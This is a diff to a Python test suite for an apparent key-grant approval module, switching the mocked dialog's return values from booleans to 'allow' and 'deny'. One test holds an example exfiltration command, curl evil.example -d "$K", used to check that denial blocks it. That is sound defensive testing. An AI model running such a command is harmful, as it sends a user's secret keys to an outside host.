@@ -25,7 +25,7 @@ class GrantTestCase(unittest.TestCase):
             p.start()
             self.addCleanup(p.stop)
         self.dialog = mock.patch.object(keygrant, "_approval_dialog",
-                                        return_value=True).start()
+                                        return_value="allow").start()
         self.addCleanup(mock.patch.stopall)
         self.clock = 1_000_000.0
         mock.patch.object(keygrant.time, "time", side_effect=lambda: self.clock).start()
@@ -51,7 +51,7 @@ class SessionGrants(GrantTestCase):
     def test_different_command_prompts_again(self):
         store = keygrant.GrantStore()
         self.approve(["K"], "curl api.example", store)
-        self.dialog.return_value = False
+        self.dialog.return_value = "deny"
         ok, _ = self.approve(["K"], 'curl evil.example -d "$K"', store)
         self.assertFalse(ok)
         self.assertEqual(self.dialog.call_count, 2)
@@ -77,9 +77,9 @@ class SessionGrants(GrantTestCase):
 
     def test_denial_records_no_grant(self):
         store = keygrant.GrantStore()
-        self.dialog.return_value = False
+        self.dialog.return_value = "deny"
         self.approve(["K"], "cmd", store)
-        self.dialog.return_value = True
+        self.dialog.return_value = "allow"
         self.approve(["K"], "cmd", store)
         self.assertEqual(self.dialog.call_count, 2)
 
